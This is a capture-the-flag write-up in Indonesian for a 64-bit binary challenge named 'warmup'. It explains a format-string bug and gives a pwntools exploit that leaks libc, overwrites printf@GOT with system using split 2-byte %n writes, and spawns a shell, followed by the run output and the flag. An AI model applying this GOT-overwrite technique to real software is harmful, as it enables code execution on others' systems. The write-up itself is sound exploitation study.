# warmup

## Binary specifications

```
› file chall; checksec chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4984522e5f7af06b83d10633244b9098efd89e55, for GNU/Linux 3.2.0, not stripped
[*] '/home/chao/Documents/FastTekno/pwn/warmup/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Binary memiliki spesifikasi 64 bit tanpa proteksi PIE

## Bug

Bug merupakan format string dimana terdapat 3 kali printf tanpa format specifier.
Namun tantangannya disini adalah tidak ada buffer overflow sehingga tidak memungkinkan untuk
overwrite return address

## Exploitation

3 kali format string tersebut dapat kita gunakan untuk:

1. Leak libc
2. Overwrite **GOT** dari **printf** menjadi **system** dari libc yang sudah di leak
3. exec **/bin/sh** melalui fungsi **printf**

Kita bisa leak **\_\_libc_start_main+243** pada offset format string ke 19(**%19$p**).
Setelah mendapatkan leak libc, selanjutnya kita hanya perlu mengubah **GOT** dari **printf** ke
**system** dari libc. Masalah pertama disini adalah panjang address libc yaitu 6 byte yang akan membuat kita
kesulitan untuk melakukan overwrite 6 byte secara langsung karena angkanya terlalu besar dan akan membuat
eksploitasi sangat lama. Solusinya adalah dengan membagi address libc menjadi 3 bagian dan mengoverwritenya
sebanyak 2 byte satu per satu sehingga angka yang dibutuhkan untuk melakukan overwrite tidak akan terlalu besar. Kode berikut akan melakukan overwrite **printf@GOT** ke **system**

```Python
  p.sendline("%19$p")
  libc_leak = int(p.recvline()[:-1], 16) - 243
  log.info("Libc leak: {}".format(hex(libc_leak)))
  libc_base = libc_leak - 0x026fc0
  log.info("Libc base: {}".format(hex(libc_base)))
  libc_system = libc_base + 0x055410
  log.info("Libc system: {}".format(hex(libc_system)))
  log.info("Printf got: {}".format(hex(printf_got)))
  overwrite1 = libc_system & 0xffff
  log.info("First overwrite: {}".format(hex(overwrite1)))
  overwrite2 = (libc_system & 0xffff0000) >> 16
  log.info("Second overwrite: {}".format(hex(overwrite2)))
  overwrite3 = libc_system >> 32
  log.info("Third overwrite: {}".format(hex(overwrite3)))

  payload = ''
  payload += '%{}c%13$lln'.format(overwrite1)
  payload += '%{}c%14$hn'.format(overwrite3 - overwrite1 if overwrite3 > overwrite1 else overwrite2 - overwrite1)
  payload += '%{}c%15$hna'.format(overwrite2 - overwrite3 if overwrite2 > overwrite3 else overwrite3 - overwrite2)
  payload += p64(printf_got)
  payload += p64(printf_got + 4)
  payload += p64(printf_got + 2)
```

Masalah kedua adalah address yang dibagi akan sangat random, dimana pada address bagian pertama sampai bagian terakhir tidak jelas angka nya(Kadang bagian kedua lebih besar dari bagian ketiga, ataupun bagian ketiga lebih besar dari bagian kedua atau pertama, dst)

```
[*] First overwrite: 0x1410
[*] Second overwrite: 0x1a60
[*] Third overwrite: 0x7f4b
```

```
[*] First overwrite: 0xc410
[*] Second overwrite: 0xb21d
[*] Third overwrite: 0x7f47
```

Dari snippet diatas, dapat kita lihat bahwa address akan sangat random sehingga membuat kode eksploitasi menjadi hoki-hokian wkwkwk. Bisa sih dibuat biar pasti, cuma aku males yaudah lah ya.

Output:

```
2:41:55 › python exploit.py local
[+] Starting local process './chall': pid 55641
[*] '/home/chao/Documents/FastTekno/pwn/warmup/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Libc leak: 0x7fd0f6273fc0
[*] Libc base: 0x7fd0f624d000
[*] Libc system: 0x7fd0f62a2410
[*] Printf got: 0x403388
[*] First overwrite: 0x2410
[*] Second overwrite: 0xf62a
[*] Third overwrite: 0x7fd0
64
%9232c%13$lln%23488c%14$hn%30298c%15$hna\x883@\x00\x00\x003@\x00\x00\x003@\x00\x00\x00
[*] Switching to interactive mode
$ cat flag.txt
FastTekno{wh4t_a_h4ck3r!!1!!}
```
